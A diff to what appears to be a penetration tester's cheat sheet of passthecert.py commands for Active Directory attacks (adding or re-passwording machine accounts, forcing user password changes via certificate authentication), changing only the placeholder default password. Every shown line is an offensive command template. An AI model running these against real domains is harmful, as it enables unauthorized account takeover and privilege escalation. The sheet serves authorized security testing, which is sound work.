@@ -30,7 +30,7 @@ passthecert.py -action ldap-shell -crt <certficcate>.crt -key <certficcate>.key 
 ## Computer mgt - add (linux)
 #plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
 ```bash
-passthecert.py -action add_computer -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -computer-name <computer_name|Jubeaz>$ -computer-pass <password|Jubeaz123+->
+passthecert.py -action add_computer -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -computer-name <computer_name|Jubeaz>$ -computer-pass <password|Zaebuj12345+->
 ```
 
 ## Computer mgt - del (linux)
@@ -42,13 +42,13 @@ passthecert.py -action del_computer -crt <certficcate>.crt -key <certficcate>.ke
 ## Computer mgt - change password (linux)
 #plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
 ```bash
-passthecert.py -action modify_computer -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -computer-name <computer_name|Jubeaz>$ -computer-pass <password|Jubeaz123+->
+passthecert.py -action modify_computer -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -computer-name <computer_name|Jubeaz>$ -computer-pass <password|Zaebuj12345+->
 ```
 
 ## User mgt - change password (linux)
 #plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
 ```bash
-passthecert.py -action forcePWDchange -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -target user_sam -new-pass <password|Jubeaz123+->
+passthecert.py -action forcePWDchange -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -target user_sam -new-pass <password|Zaebuj12345+->
 ```
 
 ## User mgt - DCSYNC (linux)
